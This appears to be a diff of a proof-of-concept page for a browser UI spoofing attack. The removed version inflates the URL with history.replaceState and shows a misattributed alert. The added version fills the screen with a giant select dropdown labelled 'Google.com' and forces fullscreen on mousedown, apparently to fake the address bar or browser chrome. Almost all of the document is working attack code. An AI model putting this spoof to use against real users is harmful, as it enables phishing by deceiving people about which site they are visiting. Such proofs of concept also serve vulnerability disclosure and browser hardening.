@@ -1,9 +1,32 @@
+<style>
+    body {
+        margin: 0;
+        padding: 0;
+        overflow-x: hidden;
+        overflow-y: hidden;
+    }
+
+    select {
+        height: 9999px;
+        width: 9999px;
+        font-size: 9em;
+    }
+</style>
+
 <script>
-a="aaaaaaaaaaaaaaaa";
-for (i = 0; i < 19; i++) { 
-a += a;
-}
-history.replaceState("example", "example", a);
-alert("This alert will be shown as 'From this page', while still rendering the page the link was clicked from");
+    function spoof() {
+        window.requestAnimationFrame(fillSelect);
+        document.documentElement.requestFullscreen();
+    }
+
+    function fillSelect() {
+        // increase the array index to extend select dropdown overlap duration
+        selectElement[641811] = optionElement;
+    }
 </script>
-The attack page goes here
+
+<select id="selectElement" onmousedown="spoof()">
+    <option id="optionElement">
+        Google.com
+    </option>
+</select>
